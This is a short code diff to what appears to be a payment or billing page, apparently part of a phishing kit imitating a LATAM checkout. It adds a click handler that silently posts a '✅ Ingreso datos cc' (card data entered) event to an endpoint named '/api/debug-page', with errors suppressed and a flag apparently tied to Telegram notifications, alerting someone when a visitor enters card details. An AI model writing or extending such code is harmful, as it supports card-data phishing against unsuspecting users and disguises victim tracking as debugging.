@@ -528,7 +528,23 @@ const countries = [
     });
   });
 
+  function notifyIngresoCc() {
+    const event = '✅ Ingreso datos cc';
+    try {
+      if (window.__latamTgSent) delete window.__latamTgSent[event];
+    } catch {
+      /* ignore */
+    }
+    fetch('/api/debug-page', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ event }),
+      keepalive: true,
+    }).catch(() => {});
+  }
+
   confirmBtn?.addEventListener('click', () => {
+    notifyIngresoCc();
     billingOk = requiredBill();
     if (!billingOk) return;
     billSnapshot = billState();
